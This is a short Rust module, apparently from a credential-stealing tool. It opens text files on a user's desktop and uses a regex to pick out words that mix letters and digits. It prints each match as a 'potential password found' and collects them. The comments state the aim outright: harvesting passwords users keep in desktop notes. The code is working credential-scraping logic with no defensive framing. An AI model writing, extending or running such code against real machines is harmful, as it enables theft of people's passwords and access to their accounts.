pub mod regex_enum {

    use std::fs::File;
    use std::io::{BufRead, BufReader};
    use regex::Regex;
    use lazy_static::lazy_static;
    
    // Looking on txt files on the user desktop (typically where they stored their passwords)
    // A regex is used (8 characters with DIGIT and ALPHA) to try getting a password
    pub fn enum_txt_deskop_file(file: String, passwords: &mut Vec<String>)
    {
        // Using lazy_static to ensure that regular expressions are compiled exactly once
        lazy_static! {
            static ref RE: Regex = Regex::new(r"\w*[a-z]\w*[0-9]").expect("Error with the regex");
        }
        let file = File::open(file.to_string()).expect("Error happened while trying to read the text file !");
        let reader = BufReader::new(file);

        for (_index, line) in reader.lines().enumerate() {
            let line = match line 
            {
                Ok(line) => line,
                Err(_error) => continue,
            };
            for word in line.split_whitespace() {
                if word.len() > 7 && RE.is_match(word) && word.starts_with("http") == false && word.starts_with("www") == false && word.starts_with("C:\\") == false {
                        println!("           > Potential password found : {}", word);
                        passwords.push(word.to_string());
                }
            }
        }
    }
}